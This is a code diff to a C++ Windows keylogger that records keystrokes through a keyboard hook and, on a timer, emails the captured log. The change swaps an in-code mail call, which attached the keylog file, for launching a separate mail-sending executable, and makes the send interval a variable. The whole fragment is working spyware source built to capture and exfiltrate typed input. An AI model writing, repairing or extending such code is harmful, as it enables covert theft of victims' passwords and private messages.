@@ -6,9 +6,9 @@
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Timer.h"
-#include "SendMail.h"
 
 std::string keylog = "";
+int timer_time = 500;
 
 void TimerSendMail()
 {
@@ -23,17 +23,13 @@ void TimerSendMail()
         Helper::WriteAppLog("File creation was not successfull. Keylog " + keylog + "");
         return;
     }
-
-    int x = Mail::SendMail("Log [" + last_file + "]",
-                           "\nThe file has been attached to this mail\nFor testing purposes:\n " + keylog, IO::GetOurPath(true) + last_file);
-    if(x != 7)
-        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x) + " Keylog: " + keylog);
-    else//Clear out keylog if sending was success
-        Helper::WriteAppLog("Mail was sent successfully");
-        keylog = "";
+    system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
+    system("pause");
+    keylog = "";
+    Helper::WriteAppLog("Email Sent");
 }
 //2000 * 60 = 2 minutes
-Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);
+Timer MailTimer(TimerSendMail, timer_time * 60, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
